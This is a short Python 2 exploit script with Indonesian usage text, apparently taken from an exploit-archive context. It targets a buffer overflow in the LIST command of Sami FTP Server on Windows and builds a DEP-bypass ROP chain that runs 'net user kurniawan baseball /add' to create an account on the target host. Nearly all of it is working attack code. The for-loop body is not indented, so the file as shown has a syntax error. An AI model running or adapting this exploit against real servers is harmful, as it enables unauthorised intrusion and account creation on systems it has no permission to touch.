#!/usr/bin/python
import socket
import sys
import struct

def littleendianaja(address):
    return struct.pack("<L",address)

if len(sys.argv) != 3:
    print "=========================================================================================="
    print "Exploit menambah user untuk target Sami FTP Server pada celah LIST di Windows bypass DEP"
    print "Programmer : Kurniawan, trainingxcode@gmail.com. xcode.co.id"
    print "------------------------------------------------------------------------------------------"
    print "Cara penggunaan : ./samibypassdep.py <ip target> <port>"
    sys.exit(1)
ipaddress = sys.argv[1]
port = int(sys.argv[2])
buf  = "\x41" * 217
eip  = littleendianaja(0x7E411069) 
rop  = "KURNIAWANDATAAJA"   
rop    += littleendianaja(0x7E41E9F6) 
rop    += littleendianaja(0x7E411069) 
rop    += littleendianaja(0x7E414238) 
rop    += littleendianaja(0x7c862aed) 
rop    += littleendianaja(0x7E4185BB) 
rop    += littleendianaja(0x7c81cb12) 
for x in range(3):
rop += littleendianaja(0x7c9c1652) 
rop += littleendianaja(0x7e423ad9)
aksesshell  = "net user kurniawan baseball /add "

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((str(ipaddress),(port)))
print s.recv(1024)
s.send("USER kurniawan\r\n")
print s.recv(1024)
s.send("PASS baseball\r\n")
print s.recv(1024)
s.send("LIST " + buf + eip + rop + aksesshell + "\r\n")
#reference bug : https://www.exploit-db.com/exploits/24875
print s.recv(1024)
s.close()
